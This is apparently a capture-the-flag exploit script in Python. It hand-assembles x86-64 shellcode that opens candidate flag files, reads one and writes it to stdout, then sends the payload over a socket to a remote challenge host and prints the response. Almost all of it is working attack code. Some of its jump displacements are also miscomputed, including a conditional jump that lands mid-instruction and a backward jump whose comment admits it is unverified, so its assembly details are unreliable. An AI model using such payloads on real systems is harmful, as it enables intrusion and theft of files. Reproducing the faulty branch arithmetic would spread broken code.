import socket
import struct
import time

# Robust ORW shellcode iterating over candidate paths
# candidate paths: "flag\0flag.txt\0/flag\0/flag.txt\0\0"

sc = bytearray()
# lea rbx, [rip + offset_to_strings]
# We'll compute displacement after assembling the code
# Let's write the code:

# 48 8d 1d [disp32]  -> lea rbx, [rip + disp32]
# loop_start:
# 80 3b 00           -> cmp byte ptr [rbx], 0
# 74 38              -> je exit_block (disp to exit)
# 48 89 df           -> mov rdi, rbx
# 48 31 f6           -> xor rsi, rsi
# 48 31 d2           -> xor rdx, rdx
# b8 02 00 00 00     -> mov eax, 2 (sys_open)
# 0f 05              -> syscall
# 85 c0              -> test eax, eax
# 79 17              -> jns found_fd

# advance_string:
# 48 ff c3           -> inc rbx
# 80 7b ff 00        -> cmp byte ptr [rbx - 1], 0
# 75 f7              -> jne advance_string
# eb e2              -> jmp loop_start

# found_fd:
# 89 c7              -> mov edi, eax
# 48 81 ec 00 01 00 00 -> sub rsp, 256
# 48 89 e6           -> mov rsi, rsp
# ba 00 01 00 00     -> mov edx, 256
# 31 c0              -> xor eax, eax (sys_read)
# 0f 05              -> syscall
# 89 c2              -> mov edx, eax (bytes read)
# bf 01 00 00 00     -> mov edi, 1 (stdout)
# 48 89 e6           -> mov rsi, rsp
# b8 01 00 00 00     -> mov eax, 1 (sys_write)
# 0f 05              -> syscall

# exit_block:
# 31 ff              -> xor edi, edi
# b8 3c 00 00 00     -> mov eax, 60 (sys_exit)
# 0f 05              -> syscall

# strings:
# b"flag\x00flag.txt\x00/flag\x00/flag.txt\x00\x00"

code = (
    b"\x80\x3b\x00"                         # 0x00: cmp byte ptr [rbx], 0
    b"\x74\x38"                             # 0x03: je exit_block (offset 0x3d)
    b"\x48\x89\xdf"                         # 0x05: mov rdi, rbx
    b"\x48\x31\xf6"                         # 0x08: xor rsi, rsi
    b"\x48\x31\xd2"                         # 0x0b: xor rdx, rdx
    b"\xb8\x02\x00\x00\x00"                 # 0x0e: mov eax, 2
    b"\x0f\x05"                             # 0x13: syscall
    b"\x85\xc0"                             # 0x15: test eax, eax
    b"\x79\x0b"                             # 0x17: jns found_fd (offset 0x24)

    # advance_string:
    b"\x48\xff\xc3"                         # 0x19: inc rbx
    b"\x80\x7b\xff\x00"                     # 0x1c: cmp byte ptr [rbx - 1], 0
    b"\x75\xf7"                             # 0x20: jne advance_string
    b"\xeb\xdb"                             # 0x22: jmp loop_start (back to 0x00: delta = 0x00 - 0x24 = -0x24 = 0xdc? let's verify)

    # found_fd (offset 0x24):
    b"\x89\xc7"                             # 0x24: mov edi, eax
    b"\x48\x81\xec\x00\x01\x00\x00"         # 0x26: sub rsp, 256
    b"\x48\x89\xe6"                         # 0x2d: mov rsi, rsp
    b"\xba\x00\x01\x00\x00"                 # 0x30: mov edx, 256
    b"\x31\xc0"                             # 0x35: xor eax, eax
    b"\x0f\x05"                             # 0x37: syscall
    b"\x89\xc2"                             # 0x39: mov edx, eax
    b"\xbf\x01\x00\x00\x00"                 # 0x3b: mov edi, 1
    b"\x48\x89\xe6"                         # 0x40: mov rsi, rsp
    b"\xb8\x01\x00\x00\x00"                 # 0x43: mov eax, 1
    b"\x0f\x05"                             # 0x48: syscall

    # exit_block (offset 0x4a):
    b"\x31\xff"                             # 0x4a: xor edi, edi
    b"\xb8\x3c\x00\x00\x00"                 # 0x4c: mov eax, 60
    b"\x0f\x05"                             # 0x51: syscall
)

# Target for initial lea rbx, [rip + disp]:
# strings follow exit_block
strings = b"flag\x00flag.txt\x00/flag\x00/flag.txt\x00\x00"

# Prefix: 48 8d 1d [disp32]
# Instruction length is 7 bytes: 48 8d 1d xx xx xx xx
# rip after instruction is offset 7.
# strings start at 7 + len(code).
# disp32 = len(code).
prefix = b"\x48\x8d\x1d" + struct.pack("<I", len(code))

full_sc = prefix + code + strings
print("Full shellcode len:", len(full_sc))

# Let's test against live target
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
s.connect(("pwn.h7tex.com", 41598))
prompt = s.recv(1024)
print("Prompt:", repr(prompt))

s.sendall(full_sc)
s.shutdown(socket.SHUT_WR) # EOF

time.sleep(0.5)
res = s.recv(4096)
print("Result from target:", repr(res))
s.close()
